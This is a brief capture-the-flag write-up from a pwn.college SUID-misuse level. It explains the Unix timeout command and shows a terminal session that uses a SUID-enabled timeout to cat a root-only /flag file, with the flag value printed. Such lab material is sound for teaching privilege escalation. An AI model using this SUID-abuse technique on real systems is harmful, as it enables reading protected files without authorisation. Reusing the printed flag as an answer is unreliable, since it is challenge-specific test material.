`timeout`

`timeout` command in unix-based os allows to execute a command with a specified time limit. It is used to limit the amount of time a command can run and terminates if it exceeds the specified duration.

> [!SYNTAX]
> `timeout [option] DURATION COMMAND`

`timeout` command can be quite handy when dealing with potentially long running or unresponsive processes, helping to prevent them from monopolizing system resources or causing delays.

```bash
hacker@program-misuse-level-28:~$ cd /
hacker@program-misuse-level-28:/$ ls
bin  boot  challenge  dev  etc  flag  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
hacker@program-misuse-level-28:/$ cd challenge/
hacker@program-misuse-level-28:/challenge$ ls
babysuid_level28
hacker@program-misuse-level-28:/challenge$ ./babysuid_level28 
Welcome to ./babysuid_level28!

This challenge is part of a series of programs that
will enable you to read flags by making them execute other commands.

I just set the SUID bit on /usr/bin/timeout.
Try to use it to read the flag!

IMPORTANT: make sure to run me (./babysuid_level28) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/timeout!
hacker@program-misuse-level-28:/challenge$ timeout 10s cat /flag
pwn.college{o7PqTOOkX_-iwHCbw-Bb3Z6ijqE.0FM3EDL0AjNzQzW}
hacker@program-misuse-level-28:/challenge$ timeout 0s cat /flag
pwn.college{o7PqTOOkX_-iwHCbw-Bb3Z6ijqE.0FM3EDL0AjNzQzW}
```

